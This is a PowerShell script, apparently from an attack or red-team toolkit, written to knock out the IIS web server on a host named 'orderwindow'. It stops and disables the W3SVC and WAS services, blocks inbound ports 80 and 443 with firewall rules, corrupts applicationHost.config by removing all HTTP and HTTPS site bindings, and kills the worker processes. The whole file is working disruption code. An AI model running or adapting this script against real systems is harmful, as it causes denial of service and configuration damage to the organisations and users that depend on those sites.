# orderwindow (10.111.2.3) - IIS disruption

# Stop IIS
Stop-Service -Name "W3SVC" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "W3SVC" -StartupType Disabled -ErrorAction SilentlyContinue

# Also stop WAS (Windows Process Activation Service) which IIS depends on
Stop-Service -Name "WAS" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "WAS" -StartupType Disabled -ErrorAction SilentlyContinue

# Block HTTP/HTTPS
$rules = @(
    @{Name="Block IIS HTTP";  Port=80},
    @{Name="Block IIS HTTPS"; Port=443}
)
foreach ($r in $rules) {
    $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
    if (-not $existing) {
        New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol TCP -LocalPort $r.Port -Action Block
    }
}

# Corrupt applicationHost.config with backup — kills all sites
$config = "C:\Windows\System32\inetsrv\config\applicationHost.config"
if (Test-Path $config) {
    Copy-Item $config "$config.bak" -ErrorAction SilentlyContinue
    # Truncate site bindings
    $content = Get-Content $config -Raw
    $content = $content -replace '<binding protocol="http"[^/]*/>', ''
    $content = $content -replace '<binding protocol="https"[^/]*/>', ''
    Set-Content $config $content -ErrorAction SilentlyContinue
}

# Kill any surviving w3wp worker processes
Get-Process -Name "w3wp" -ErrorAction SilentlyContinue | Stop-Process -Force

Write-Host "[*] IIS disruption complete on orderwindow"
